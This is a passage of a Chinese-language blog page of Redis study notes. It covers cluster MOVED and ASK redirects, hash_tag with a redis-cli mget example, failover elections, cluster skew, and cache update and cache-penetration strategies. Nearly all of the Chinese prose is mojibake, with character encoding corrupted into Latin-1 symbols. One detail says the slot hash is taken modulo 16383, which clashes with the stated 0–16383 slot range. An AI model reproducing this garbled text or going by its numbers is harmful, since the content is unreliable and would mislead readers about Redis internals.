class="line">downNode.shutdown();</span><br></pre></td></tr></table></figure><p>å½“ä¸‹çº¿ä¸»èŠ‚ç‚¹å…·æœ‰ä»èŠ‚ç‚¹æ—¶éœ€è¦æŠŠè¯¥ä»èŠ‚ç‚¹æŒ‡å‘åˆ°å…¶ä»–ä¸»èŠ‚ç‚¹ï¼Œå› æ­¤å¯¹äºä¸»ä»èŠ‚ç‚¹éƒ½ä¸‹çº¿çš„æƒ…å†µï¼Œå»ºè®®å…ˆä¸‹çº¿ä»èŠ‚ç‚¹å†ä¸‹çº¿ä¸»èŠ‚ç‚¹ï¼Œé˜²æ­¢ä¸å¿…è¦çš„å…¨é‡å¤åˆ¶ã€‚</p><h2 id="è¯·æ±‚è·¯ç”±"><a href="#è¯·æ±‚è·¯ç”±" class="headerlink" title="è¯·æ±‚è·¯ç”±"></a>è¯·æ±‚è·¯ç”±</h2><h3 id="è¯·æ±‚é‡å®šå‘"><a href="#è¯·æ±‚é‡å®šå‘" class="headerlink" title="è¯·æ±‚é‡å®šå‘"></a>è¯·æ±‚é‡å®šå‘</h3><p>åœ¨é›†ç¾¤æ¨¡å¼ä¸‹ï¼ŒRedisæ¥æ”¶ä»»ä½•é”®ç›¸å…³å‘½ä»¤æ—¶é¦–å…ˆè®¡ç®—é”®å¯¹åº”çš„æ§½ï¼Œå†æ ¹æ®æ§½æ‰¾å‡ºæ‰€å¯¹åº”çš„èŠ‚ç‚¹ï¼Œå¦‚æœèŠ‚ç‚¹æ˜¯è‡ªèº«ï¼Œåˆ™å¤„ç†é”®å‘½ä»¤ï¼›å¦åˆ™å›å¤MOVEDé‡å®šå‘é”™è¯¯ï¼Œé€šçŸ¥å®¢æˆ·ç«¯è¯·æ±‚æ­£ç¡®çš„èŠ‚ç‚¹ã€‚è¿™ä¸ªè¿‡ç¨‹ç§°ä¸ºMOVEDé‡å®šå‘ã€‚<br><img src="https://tva1.sinaimg.cn/large/006tNbRwly1g9jhv81y3pj30j00jrwhp.jpg" alt=""></p><p>å¯ä»¥é€šè¿‡<code>cluster keyslot{key}</code>å‘½ä»¤è¿”å›keyæ‰€å¯¹åº”çš„æ§½ï¼Œè¯¥å‘½ä»¤é‡‡ç”¨<code>key_hash_slot()</code>å‡½æ•°å®ç°ã€‚<br>ä½¿ç”¨<code>redis-cli</code>å‘½ä»¤æ—¶ï¼Œå¯ä»¥åŠ å…¥<code>-c</code>å‚æ•°æ”¯æŒè‡ªåŠ¨é‡å®šå‘ï¼Œç®€åŒ–æ‰‹åŠ¨å‘èµ·é‡å®šå‘æ“ä½œã€‚</p><p>é”®å‘½ä»¤æ‰§è¡Œæ­¥éª¤ä¸»è¦åˆ†ä¸¤æ­¥ï¼šè®¡ç®—æ§½ï¼ŒæŸ¥æ‰¾æ§½æ‰€å¯¹åº”çš„èŠ‚ç‚¹ã€‚</p><ol><li>Redisé¦–å…ˆéœ€è¦è®¡ç®—é”®æ‰€å¯¹åº”çš„æ§½ã€‚æ ¹æ®é”®çš„æœ‰æ•ˆéƒ¨åˆ†ä½¿ç”¨CRC16å‡½æ•°è®¡ç®—å‡ºæ•£åˆ—å€¼ï¼Œå†å–å¯¹16383çš„ä½™æ•°ï¼Œä½¿æ¯ä¸ªé”®éƒ½å¯ä»¥æ˜ å°„åˆ°0~16383æ§½èŒƒå›´å†…ã€‚</li><li>èŠ‚ç‚¹å¯¹äºåˆ¤å®šé”®å‘½ä»¤æ˜¯æ‰§è¡Œè¿˜æ˜¯MOVEDé‡å®šå‘ï¼Œéƒ½æ˜¯å€ŸåŠ©<code>slots [CLUSTER_SLOTS]</code>æ•°ç»„å®ç°ã€‚æ ¹æ®MOVEDé‡å®šå‘æœºåˆ¶ï¼Œå®¢æˆ·ç«¯å¯ä»¥éšæœºè¿æ¥é›†ç¾¤å†…ä»»ä¸€Redisè·å–é”®æ‰€åœ¨èŠ‚ç‚¹ï¼Œè¿™ç§å®¢æˆ·ç«¯åˆå«Dummyï¼ˆå‚€å„¡ï¼‰å®¢æˆ·ç«¯ï¼Œå®ƒä¼˜ç‚¹æ˜¯ä»£ç å®ç°ç®€å•ï¼Œå¯¹å®¢æˆ·ç«¯åè®®å½±å“è¾ƒå°ï¼Œåªéœ€è¦æ ¹æ®é‡å®šå‘ä¿¡æ¯å†æ¬¡å‘é€è¯·æ±‚å³å¯ã€‚ä½†æ˜¯å®ƒçš„å¼Šç«¯å¾ˆæ˜æ˜¾ï¼Œæ¯æ¬¡æ‰§è¡Œé”®å‘½ä»¤å‰éƒ½è¦åˆ°Redisä¸Šè¿›è¡Œé‡å®šå‘æ‰èƒ½æ‰¾åˆ°è¦æ‰§è¡Œå‘½ä»¤çš„èŠ‚ç‚¹ï¼Œé¢å¤–å¢åŠ äº†IOå¼€é”€ï¼Œè¿™ä¸æ˜¯Redisé›†ç¾¤é«˜æ•ˆçš„ä½¿ç”¨æ–¹å¼ã€‚æ­£å› ä¸ºå¦‚æ­¤é€šå¸¸é›†ç¾¤å®¢æˆ·ç«¯éƒ½é‡‡ç”¨å¦ä¸€ç§å®ç°ï¼šSmartï¼ˆæ™ºèƒ½ï¼‰å®¢æˆ·ç«¯ã€‚Smartå®¢æˆ·ç«¯é€šè¿‡åœ¨å†…éƒ¨ç»´æŠ¤slotâ†’nodeçš„æ˜ å°„å…³ç³»ï¼Œæœ¬åœ°å°±å¯å®ç°é”®åˆ°èŠ‚ç‚¹çš„æŸ¥æ‰¾ï¼Œä»è€Œä¿è¯IOæ•ˆç‡çš„æœ€å¤§åŒ–ï¼Œè€ŒMOVEDé‡å®šå‘è´Ÿè´£ååŠ©Smartå®¢æˆ·ç«¯æ›´æ–°slotâ†’nodeæ˜ å°„ã€‚</li></ol><h4 id="hash-tag"><a href="#hash-tag" class="headerlink" title="hash_tag"></a>hash_tag</h4><p>hash_tag å…è®¸ç”¨ key çš„éƒ¨åˆ†å­—ç¬¦ä¸²æ¥è®¡ç®— hashã€‚å½“ä¸€ä¸ª key åŒ…å« {} çš„æ—¶å€™ï¼Œå°±ä¸å¯¹æ•´ä¸ª key åš hashï¼Œè€Œä»…å¯¹ {} åŒ…æ‹¬çš„å­—ç¬¦ä¸²åš hashã€‚</p><p>åœ¨é›†ç¾¤æ¨¡å¼ä¸‹ä½¿ç”¨mgetç­‰å‘½ä»¤ä¼˜åŒ–æ‰¹é‡è°ƒç”¨æ—¶ï¼Œé”®åˆ—è¡¨å¿…é¡»å…·æœ‰ç›¸åŒçš„slotï¼Œå¦åˆ™ä¼šæŠ¥é”™ã€‚è¿™æ—¶å¯ä»¥åˆ©ç”¨hash_tagè®©ä¸åŒçš„é”®å…·æœ‰ç›¸åŒçš„slotè¾¾åˆ°ä¼˜åŒ–çš„ç›®çš„ã€‚å‘½ä»¤å¦‚ä¸‹ï¼š</p><figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">6385</span>&gt; mget <span class="keyword">user</span>:<span class="number">10086</span>:frends <span class="keyword">user</span>:<span class="number">10086</span>:videos</span><br><span class="line">(error) CROSSSLOT Keys <span class="keyword">in</span> request don't hash <span class="keyword">to</span> the same slot</span><br><span class="line"><span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">6385</span>&gt; mget <span class="keyword">user</span>:&#123;<span class="number">10086</span>&#125;:friends <span class="keyword">user</span>:&#123;<span class="number">10086</span>&#125;:videos</span><br><span class="line"><span class="number">1</span>) <span class="string">"friends"</span></span><br><span class="line"><span class="number">2</span>) <span class="string">"videos"</span></span><br></pre></td></tr></table></figure><p>PipelineåŒæ ·å¯ä»¥å—ç›Šäºhash_tagï¼Œç”±äºPipelineåªèƒ½å‘ä¸€ä¸ªèŠ‚ç‚¹æ‰¹é‡å‘é€æ‰§è¡Œå‘½ä»¤ï¼Œè€Œç›¸åŒslotå¿…ç„¶ä¼šå¯¹åº”åˆ°å”¯ä¸€çš„èŠ‚ç‚¹ï¼Œé™ä½äº†é›†ç¾¤ä½¿ç”¨Pipelineçš„é—¨æ§›ã€‚</p><h3 id="ASK-é‡å®šå‘"><a href="#ASK-é‡å®šå‘" class="headerlink" title="ASK é‡å®šå‘"></a>ASK é‡å®šå‘</h3><p>å½“slotå¯¹åº”çš„æ•°æ®ä»æºèŠ‚ç‚¹åˆ°ç›®æ ‡èŠ‚ç‚¹è¿ç§»è¿‡ç¨‹ä¸­ï¼Œå®¢æˆ·ç«¯éœ€è¦åšåˆ°æ™ºèƒ½è¯†åˆ«ï¼Œä¿è¯é”®å‘½ä»¤å¯æ­£å¸¸æ‰§è¡Œã€‚ä¾‹å¦‚å½“ä¸€ä¸ªslotæ•°æ®ä»æºèŠ‚ç‚¹è¿ç§»åˆ°ç›®æ ‡èŠ‚ç‚¹æ—¶ï¼ŒæœŸé—´å¯èƒ½å‡ºç°ä¸€éƒ¨åˆ†æ•°æ®åœ¨æºèŠ‚ç‚¹ï¼Œè€Œå¦ä¸€éƒ¨åˆ†åœ¨ç›®æ ‡èŠ‚ç‚¹ã€‚</p><p><img src="https://tva1.sinaimg.cn/large/006tNbRwly1g9qoovqnpwj30u00vlk0z.jpg" alt=""></p><p><img src="https://tva1.sinaimg.cn/large/006tNbRwly1g9qop67mnjj311m0ti0z1.jpg" alt=""></p><p>ASKä¸MOVEDè™½ç„¶éƒ½æ˜¯å¯¹å®¢æˆ·ç«¯çš„é‡å®šå‘æ§åˆ¶ï¼Œä½†æ˜¯æœ‰ç€æœ¬è´¨åŒºåˆ«ã€‚ASKé‡å®šå‘è¯´æ˜é›†ç¾¤æ­£åœ¨è¿›è¡Œslotæ•°æ®è¿ç§»ï¼Œå®¢æˆ·ç«¯æ— æ³•çŸ¥é“ä»€ä¹ˆæ—¶å€™è¿ç§»å®Œæˆï¼Œå› æ­¤åªèƒ½æ˜¯ä¸´æ—¶æ€§çš„é‡å®šå‘ï¼Œå®¢æˆ·ç«¯ä¸ä¼šæ›´æ–°slotsç¼“å­˜ã€‚ä½†æ˜¯MOVEDé‡å®šå‘è¯´æ˜é”®å¯¹åº”çš„æ§½å·²ç»æ˜ç¡®æŒ‡å®šåˆ°æ–°çš„èŠ‚ç‚¹ï¼Œå› æ­¤éœ€è¦æ›´æ–°slotsç¼“å­˜ã€‚</p><p>ä¸ºäº†æ”¯æŒASKé‡å®šå‘ï¼ŒæºèŠ‚ç‚¹å’Œç›®æ ‡èŠ‚ç‚¹åœ¨å†…éƒ¨çš„clusterStateç»“æ„ä¸­ç»´æŠ¤å½“å‰æ­£åœ¨è¿ç§»çš„æ§½ä¿¡æ¯ï¼Œç”¨äºè¯†åˆ«æ§½è¿ç§»æƒ…å†µã€‚</p><ul><li>å¦‚æœé”®æ‰€åœ¨çš„æ§½ç”±å½“å‰èŠ‚ç‚¹è´Ÿè´£ï¼Œä½†é”®ä¸å­˜åœ¨åˆ™æŸ¥æ‰¾<code>migrating_slots_to</code>æ•°ç»„æŸ¥çœ‹æ§½æ˜¯å¦æ­£åœ¨è¿å‡ºï¼Œå¦‚æœæ˜¯è¿”å›ASKé‡å®šå‘ã€‚</li><li>å¦‚æœå®¢æˆ·ç«¯å‘é€<code>asking</code>å‘½ä»¤æ‰“å¼€äº†<code>CLIENT_ASKING</code>æ ‡è¯†ï¼Œåˆ™è¯¥å®¢æˆ·ç«¯ä¸‹æ¬¡å‘é€é”®å‘½ä»¤æ—¶æŸ¥æ‰¾<code>importing_slots_from</code>æ•°ç»„è·å–<code>clusterNode</code>ï¼Œå¦‚æœæŒ‡å‘è‡ªèº«åˆ™æ‰§è¡Œå‘½ä»¤ã€‚<ul><li>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œaskingå‘½ä»¤æ˜¯ä¸€æ¬¡æ€§å‘½ä»¤ï¼Œæ¯æ¬¡æ‰§è¡Œå®Œåå®¢æˆ·ç«¯æ ‡è¯†éƒ½ä¼šä¿®æ”¹å›åŸçŠ¶æ€ï¼Œå› æ­¤æ¯æ¬¡å®¢æˆ·ç«¯æ¥æ”¶åˆ°ASKé‡å®šå‘åéƒ½éœ€è¦å‘é€askingå‘½ä»¤ã€‚</li></ul></li><li>ASKé‡å®šå‘å¯¹å•é”®å‘½ä»¤æ”¯æŒå¾—å¾ˆå®Œå–„ã€‚å½“æ§½å¤„äºè¿ç§»çŠ¶æ€æ—¶ï¼Œæ‰¹é‡æ“ä½œä¼šå—åˆ°å½±å“ã€‚</li></ul><p>ä½¿ç”¨smartå®¢æˆ·ç«¯æ‰¹é‡æ“ä½œé›†ç¾¤æ—¶ï¼Œéœ€è¦è¯„ä¼°<code>mget/mset</code>ã€Pipelineç­‰æ–¹å¼åœ¨slotè¿ç§»åœºæ™¯ä¸‹çš„å®¹é”™æ€§ï¼Œé˜²æ­¢é›†ç¾¤è¿ç§»é€ æˆå¤§é‡é”™è¯¯å’Œæ•°æ®ä¸¢å¤±çš„æƒ…å†µã€‚</p><p>é›†ç¾¤ç¯å¢ƒä¸‹å¯¹äºä½¿ç”¨æ‰¹é‡æ“ä½œçš„åœºæ™¯ï¼Œå»ºè®®ä¼˜å…ˆä½¿ç”¨Pipelineæ–¹å¼ï¼Œåœ¨å®¢æˆ·ç«¯å®ç°å¯¹ASKé‡å®šå‘çš„æ­£ç¡®å¤„ç†ï¼Œè¿™æ ·æ—¢å¯ä»¥å—ç›Šäºæ‰¹é‡æ“ä½œçš„IOä¼˜åŒ–ï¼Œåˆå¯ä»¥å…¼å®¹slotè¿ç§»åœºæ™¯ã€‚</p><h2 id="æ•…éšœè½¬ç§»-1"><a href="#æ•…éšœè½¬ç§»-1" class="headerlink" title="æ•…éšœè½¬ç§»"></a>æ•…éšœè½¬ç§»</h2><p>å½“æŸä¸ªèŠ‚ç‚¹è¢«ä¸»è§‚ä¸‹çº¿åï¼Œping/pongæ¶ˆæ¯çš„æ¶ˆæ¯ä½“ä¼šæºå¸¦é›†ç¾¤1/10çš„å…¶ä»–èŠ‚ç‚¹çŠ¶æ€æ•°æ®åœ¨é›†ç¾¤å†…ä¼ æ’­ã€‚å½“åŠæ•°ä»¥ä¸ŠæŒæœ‰æ§½çš„ä¸»èŠ‚ç‚¹éƒ½æ ‡è®°æŸä¸ªèŠ‚ç‚¹æ˜¯ä¸»è§‚ä¸‹çº¿æ—¶ï¼Œè§¦å‘å®¢è§‚ä¸‹çº¿æµç¨‹ã€‚</p><p>æ¯ä¸ªä¸‹çº¿æŠ¥å‘Šéƒ½å­˜åœ¨æœ‰æ•ˆæœŸ(<code>cluster-node-time*2</code>)ï¼Œæ¯æ¬¡åœ¨å°è¯•è§¦å‘å®¢è§‚ä¸‹çº¿æ—¶ï¼Œéƒ½ä¼šæ£€æµ‹ä¸‹çº¿æŠ¥å‘Šæ˜¯å¦è¿‡æœŸï¼Œå¯¹äºè¿‡æœŸçš„ä¸‹çº¿æŠ¥å‘Šå°†è¢«åˆ é™¤ã€‚</p><p>å¦‚æœåœ¨<code>cluster-node-time*2</code>æ—¶é—´å†…æ— æ³•æ”¶é›†åˆ°ä¸€åŠä»¥ä¸Šæ§½èŠ‚ç‚¹çš„ä¸‹çº¿æŠ¥å‘Šï¼Œé‚£ä¹ˆä¹‹å‰çš„ä¸‹çº¿æŠ¥å‘Šå°†ä¼šè¿‡æœŸï¼Œä¹Ÿå°±æ˜¯è¯´ä¸»è§‚ä¸‹çº¿ä¸ŠæŠ¥çš„é€Ÿåº¦è¿½èµ¶ä¸ä¸Šä¸‹çº¿æŠ¥å‘Šè¿‡æœŸçš„é€Ÿåº¦ï¼Œé‚£ä¹ˆæ•…éšœèŠ‚ç‚¹å°†æ°¸è¿œæ— æ³•è¢«æ ‡è®°ä¸ºå®¢è§‚ä¸‹çº¿ä»è€Œå¯¼è‡´æ•…éšœè½¬ç§»å¤±è´¥ã€‚å› æ­¤ä¸å»ºè®®å°†<code>cluster-node-time</code>è®¾ç½®å¾—è¿‡å°ã€‚</p><p><img src="https://tva1.sinaimg.cn/large/006tNbRwly1g9qp56c761j30u010847e.jpg" alt=""></p><p>æ•…éšœæ¢å¤æµç¨‹ï¼š</p><ol><li>èµ„æ ¼æ£€æŸ¥</li><li>å‡†å¤‡é€‰ä¸¾æ—¶é—´</li><li>å‘èµ·é€‰ä¸¾</li><li>é€‰ä¸¾æŠ•ç¥¨</li><li>æ›¿æ¢ä¸»èŠ‚ç‚¹</li></ol><p>æŠ•ç¥¨ä½œåºŸï¼šæ¯ä¸ªé…ç½®çºªå…ƒä»£è¡¨äº†ä¸€æ¬¡é€‰ä¸¾å‘¨æœŸï¼Œå¦‚æœåœ¨å¼€å§‹æŠ•ç¥¨ä¹‹åçš„<code>cluster-node-timeout*2</code>æ—¶é—´å†…ä»èŠ‚ç‚¹æ²¡æœ‰è·å–è¶³å¤Ÿæ•°é‡çš„æŠ•ç¥¨ï¼Œåˆ™æœ¬æ¬¡é€‰ä¸¾ä½œåºŸã€‚ä»èŠ‚ç‚¹å¯¹é…ç½®çºªå…ƒè‡ªå¢å¹¶å‘èµ·ä¸‹ä¸€è½®æŠ•ç¥¨ï¼Œç›´åˆ°é€‰ä¸¾æˆåŠŸä¸ºæ­¢ã€‚</p><p>æ•…éšœè½¬ç§»æ—¶é—´ï¼š<code>failover-time(æ¯«ç§’) â‰¤ cluster-node-timeout + cluster-node-timeout/2 + 1000</code></p><h2 id="é›†ç¾¤è¿ç»´"><a href="#é›†ç¾¤è¿ç»´" class="headerlink" title="é›†ç¾¤è¿ç»´"></a>é›†ç¾¤è¿ç»´</h2><p>é›†ç¾¤å€¾æ–œ</p><ul><li>æ•°æ®å€¾æ–œ<ul><li>èŠ‚ç‚¹å’Œæ§½åˆ†é…ä¸¥é‡ä¸å‡ã€‚å¯ä»¥ä½¿ç”¨<code>redis-trib.rb info{host:ip}</code>è¿›è¡Œå®šä½</li><li>ä¸åŒæ§½å¯¹åº”é”®æ•°é‡å·®å¼‚è¿‡å¤§ã€‚é”®é€šè¿‡CRC16å“ˆå¸Œå‡½æ•°æ˜ å°„åˆ°æ§½ä¸Šï¼Œæ­£å¸¸æƒ…å†µä¸‹æ§½å†…é”®æ•°é‡ä¼šç›¸å¯¹å‡åŒ€ã€‚ä½†å½“å¤§é‡ä½¿ç”¨hash_tagæ—¶ï¼Œä¼šäº§ç”Ÿä¸åŒçš„é”®æ˜ å°„åˆ°åŒä¸€ä¸ªæ§½çš„æƒ…å†µã€‚ç‰¹åˆ«æ˜¯é€‰æ‹©ä½œä¸ºhash_tagçš„æ•°æ®ç¦»æ•£åº¦è¾ƒå·®æ—¶ï¼Œå°†åŠ é€Ÿæ§½å†…é”®æ•°é‡å€¾æ–œæƒ…å†µã€‚é€šè¿‡å‘½ä»¤<code>cluster countkeysinslot{slot}</code>å¯ä»¥è·å–æ§½å¯¹åº”çš„é”®æ•°é‡ï¼Œè¯†åˆ«å‡ºå“ªäº›æ§½æ˜ å°„äº†è¿‡å¤šçš„é”®ã€‚å†é€šè¿‡å‘½ä»¤<code>clustergetkeysinslot{slot}{count}</code>å¾ªç¯è¿­ä»£å‡ºæ§½ä¸‹æ‰€æœ‰çš„é”®ã€‚ä»è€Œå‘ç°è¿‡åº¦ä½¿ç”¨hash_tagçš„é”®ã€‚</li><li>é›†åˆå¯¹è±¡åŒ…å«å¤§é‡å…ƒç´ ã€‚</li><li>å†…å­˜ç›¸å…³é…ç½®ä¸ä¸€è‡´ã€‚</li></ul></li><li>è¯·æ±‚å€¾æ–œ<ul><li>åˆç†è®¾è®¡é”®ï¼Œçƒ­ç‚¹å¤§é›†åˆå¯¹è±¡åšæ‹†åˆ†æˆ–ä½¿ç”¨hmgetæ›¿ä»£hgetallé¿å…æ•´ä½“è¯»å–ã€‚</li><li>ä¸è¦ä½¿ç”¨çƒ­é”®ä½œä¸ºhash_tagï¼Œé¿å…æ˜ å°„åˆ°åŒä¸€æ§½ã€‚</li><li>å¯¹äºä¸€è‡´æ€§è¦æ±‚ä¸é«˜çš„åœºæ™¯ï¼Œå®¢æˆ·ç«¯å¯ä½¿ç”¨æœ¬åœ°ç¼“å­˜å‡å°‘çƒ­é”®è°ƒç”¨ã€‚</li></ul></li></ul><p>é›†ç¾¤æ¨¡å¼ä¸‹ä»èŠ‚ç‚¹ä¸æ¥å—ä»»ä½•è¯»å†™è¯·æ±‚ï¼Œå‘é€è¿‡æ¥çš„é”®å‘½ä»¤ä¼šé‡å®šå‘åˆ°è´Ÿè´£æ§½çš„ä¸»èŠ‚ç‚¹ä¸Šã€‚å½“éœ€è¦ä½¿ç”¨ä»èŠ‚ç‚¹åˆ†æ‹…ä¸»èŠ‚ç‚¹è¯»å‹åŠ›æ—¶ï¼Œå¯ä»¥ä½¿ç”¨<code>readonly</code>å‘½ä»¤æ‰“å¼€å®¢æˆ·ç«¯è¿æ¥åªè¯»çŠ¶æ€ã€‚<code>readonly</code>å‘½ä»¤æ˜¯è¿æ¥çº§åˆ«ç”Ÿæ•ˆï¼Œå› æ­¤æ¯æ¬¡æ–°å»ºè¿æ¥æ—¶éƒ½éœ€è¦æ‰§è¡Œ<code>readonly</code>å¼€å¯åªè¯»çŠ¶æ€ã€‚æ‰§è¡Œ<code>readwrite</code>å‘½ä»¤å¯ä»¥å…³é—­è¿æ¥åªè¯»çŠ¶æ€ã€‚</p><h1 id="ç¬¬-11-ç« -ç¼“å­˜è®¾è®¡"><a href="#ç¬¬-11-ç« -ç¼“å­˜è®¾è®¡" class="headerlink" title="ç¬¬ 11 ç«  ç¼“å­˜è®¾è®¡"></a>ç¬¬ 11 ç«  ç¼“å­˜è®¾è®¡</h1><h2 id="ç¼“å­˜æ›´æ–°ç­–ç•¥"><a href="#ç¼“å­˜æ›´æ–°ç­–ç•¥" class="headerlink" title="ç¼“å­˜æ›´æ–°ç­–ç•¥"></a>ç¼“å­˜æ›´æ–°ç­–ç•¥</h2><h3 id="LRU-LFU-FIFO-ç®—æ³•å‰”é™¤"><a href="#LRU-LFU-FIFO-ç®—æ³•å‰”é™¤" class="headerlink" title="LRU/LFU/FIFO ç®—æ³•å‰”é™¤"></a>LRU/LFU/FIFO ç®—æ³•å‰”é™¤</h3><p>ä½¿ç”¨åœºæ™¯ï¼šå‰”é™¤ç®—æ³•é€šå¸¸ç”¨äºç¼“å­˜ä½¿ç”¨é‡è¶…è¿‡äº†é¢„è®¾çš„æœ€å¤§å€¼æ—¶å€™ï¼Œå¦‚ä½•å¯¹ç°æœ‰çš„æ•°æ®è¿›è¡Œå‰”é™¤ã€‚<br>ä¸€è‡´æ€§ï¼šè¦æ¸…ç†å“ªäº›æ•°æ®æ˜¯ç”±å…·ä½“ç®—æ³•å†³å®šï¼Œå¼€å‘äººå‘˜åªèƒ½å†³å®šä½¿ç”¨å“ªç§ç®—æ³•ï¼Œæ‰€ä»¥æ•°æ®çš„ä¸€è‡´æ€§æ˜¯æœ€å·®çš„ã€‚<br>ç»´æŠ¤æˆæœ¬ï¼šç®—æ³•ä¸éœ€è¦å¼€å‘äººå‘˜è‡ªå·±æ¥å®ç°ï¼Œé€šå¸¸åªéœ€è¦é…ç½®æœ€å¤§<code>maxmemory</code>å’Œå¯¹åº”çš„ç­–ç•¥å³å¯ã€‚å¼€å‘äººå‘˜åªéœ€è¦çŸ¥é“æ¯ç§ç®—æ³•çš„å«ä¹‰ï¼Œé€‰æ‹©é€‚åˆè‡ªå·±çš„ç®—æ³•å³å¯ã€‚</p><h3 id="è¶…æ—¶å‰”é™¤"><a href="#è¶…æ—¶å‰”é™¤" class="headerlink" title="è¶…æ—¶å‰”é™¤"></a>è¶…æ—¶å‰”é™¤</h3><p>ä½¿ç”¨åœºæ™¯ï¼šå¦‚æœä¸šåŠ¡å¯ä»¥å®¹å¿ä¸€æ®µæ—¶é—´å†…ï¼Œç¼“å­˜å±‚æ•°æ®å’Œå­˜å‚¨å±‚æ•°æ®ä¸ä¸€è‡´ï¼Œé‚£ä¹ˆå¯ä»¥ä¸ºå…¶è®¾ç½®è¿‡æœŸæ—¶é—´ã€‚å¦‚ä¸€ä¸ªè§†é¢‘çš„æè¿°ä¿¡æ¯ï¼Œå¯ä»¥å®¹å¿å‡ åˆ†é’Ÿå†…æ•°æ®ä¸ä¸€è‡´ï¼Œä½†æ˜¯æ¶‰åŠäº¤æ˜“æ–¹é¢çš„ä¸šåŠ¡åˆ™ä¸é€‚ç”¨ã€‚<br>ä¸€è‡´æ€§ï¼šä¸€æ®µæ—¶é—´çª—å£å†…å­˜åœ¨ä¸€è‡´æ€§é—®é¢˜ã€‚<br>ç»´æŠ¤æˆæœ¬ï¼šåªéœ€è®¾ç½®<code>expire</code>è¿‡æœŸæ—¶é—´å³å¯ï¼Œç»´æŠ¤æˆæœ¬è¾ƒä½ã€‚</p><h3 id="ä¸»åŠ¨æ›´æ–°"><a href="#ä¸»åŠ¨æ›´æ–°" class="headerlink" title="ä¸»åŠ¨æ›´æ–°"></a>ä¸»åŠ¨æ›´æ–°</h3><p>ä½¿ç”¨åœºæ™¯ï¼šåº”ç”¨æ–¹å¯¹äºæ•°æ®çš„ä¸€è‡´æ€§è¦æ±‚é«˜ï¼Œéœ€è¦åœ¨çœŸå®æ•°æ®æ›´æ–°åï¼Œç«‹å³æ›´æ–°ç¼“å­˜æ•°æ®ã€‚<br>ä¸€è‡´æ€§ï¼šä¸€è‡´æ€§æœ€é«˜ï¼Œä½†å¦‚æœä¸»åŠ¨æ›´æ–°å‘ç”Ÿäº†é—®é¢˜ï¼Œé‚£ä¹ˆè¿™æ¡æ•°æ®å¾ˆå¯èƒ½å¾ˆé•¿æ—¶é—´ä¸ä¼šæ›´æ–°ï¼Œæ‰€ä»¥<strong>å»ºè®®ç»“åˆè¶…æ—¶å‰”é™¤ä¸€èµ·ä½¿ç”¨æ•ˆæœä¼šæ›´å¥½</strong>ã€‚<br>ç»´æŠ¤æˆæœ¬ï¼šç»´æŠ¤æˆæœ¬è¾ƒé«˜ï¼Œå¼€å‘è€…éœ€è¦è‡ªå·±æ¥å®Œæˆæ›´æ–°ï¼Œå¹¶ä¿è¯æ›´æ–°æ“ä½œçš„æ­£ç¡®æ€§ã€‚</p><h3 id="æœ€ä½³å®è·µ"><a href="#æœ€ä½³å®è·µ" class="headerlink" title="æœ€ä½³å®è·µ"></a>æœ€ä½³å®è·µ</h3><ol><li>ä½ä¸€è‡´æ€§ä¸šåŠ¡å»ºè®®é…ç½®æœ€å¤§å†…å­˜å’Œæ·˜æ±°ç­–ç•¥çš„æ–¹å¼ä½¿ç”¨ã€‚</li><li>é«˜ä¸€è‡´æ€§ä¸šåŠ¡å¯ä»¥ç»“åˆä½¿ç”¨è¶…æ—¶å‰”é™¤å’Œä¸»åŠ¨æ›´æ–°ï¼Œè¿™æ ·å³ä½¿ä¸»åŠ¨æ›´æ–°å‡ºäº†é—®é¢˜ï¼Œä¹Ÿèƒ½ä¿è¯æ•°æ®è¿‡æœŸæ—¶é—´ååˆ é™¤è„æ•°æ®ã€‚</li></ol><h2 id="ç¼“å­˜ç©¿é€"><a href="#ç¼“å­˜ç©¿é€" class="headerlink" title="ç¼“å­˜ç©¿é€"></a>ç¼“å­˜ç©¿é€</h2><p>ç¼“å­˜ç©¿é€æ˜¯æŒ‡æŸ¥è¯¢ä¸€ä¸ªæ ¹æœ¬ä¸å­˜åœ¨çš„æ•°æ®ï¼Œç¼“å­˜å±‚å’Œå­˜å‚¨å±‚éƒ½ä¸ä¼šå‘½ä¸­ã€‚é€ æˆç¼“å­˜ç©¿é€çš„åŸºæœ¬åŸå› æœ‰ä¸¤ä¸ªã€‚ç¬¬ä¸€ï¼Œè‡ªèº«ä¸šåŠ¡ä»£ç æˆ–è€…æ•°æ®å‡ºç°é—®é¢˜ï¼Œç¬¬äºŒï¼Œä¸€äº›æ¶æ„æ”»å‡»ã€çˆ¬è™«ç­‰é€ æˆå¤§é‡ç©ºå‘½ä¸­ã€‚</p><h3 id="ç¼“å­˜ç©¿é€çš„è§£å†³æ–¹æ¡ˆ"><a href="#ç¼“å­˜ç©¿é€çš„è§£å†³æ–¹æ¡ˆ" class="headerlink" title="ç¼“å­˜ç©¿é€çš„è§£å†³æ–¹æ¡ˆ"></a>ç¼“å­˜ç©¿é€çš„è§£å†³æ–¹æ¡ˆ</h3><h4 id="1-ç¼“å­˜ç©ºå¯¹è±¡"><a href="#1-ç¼“å­˜ç©ºå¯¹è±¡" class="headerlink" title="1. ç¼“å­˜ç©ºå¯¹è±¡"></a>1. ç¼“å­˜ç©ºå¯¹è±¡</h4><p>ç¼“å­˜ç©ºå¯¹è±¡ä¼šæœ‰ä¸¤ä¸ªé—®é¢˜ï¼šç¬¬ä¸€ï¼Œç©ºå€¼åšäº†ç¼“å­˜ï¼Œæ„å‘³ç€ç¼“å­˜å±‚ä¸­å­˜äº†æ›´å¤šçš„é”®ï¼Œéœ€è¦æ›´å¤šçš„å†…å­˜ç©ºé—´ï¼ˆå¦‚æœæ˜¯æ”»å‡»ï¼Œé—®é¢˜æ›´ä¸¥é‡ï¼‰ï¼Œæ¯”è¾ƒæœ‰æ•ˆçš„æ–¹æ³•æ˜¯é’ˆå¯¹è¿™ç±»æ•°æ®è®¾ç½®ä¸€ä¸ªè¾ƒçŸ­çš„è¿‡æœŸæ—¶é—´ï¼Œè®©å…¶è‡ªåŠ¨å‰”é™¤ã€‚ç¬¬äºŒï¼Œç¼“å­˜å±‚å’Œå­˜å‚¨å±‚çš„æ•°æ®ä¼šæœ‰ä¸€æ®µæ—¶é—´çª—å£çš„ä¸ä¸€è‡´ï¼Œå¯èƒ½ä¼šå¯¹ä¸šåŠ¡æœ‰ä¸€å®šå½±å“ã€‚ä¾‹å¦‚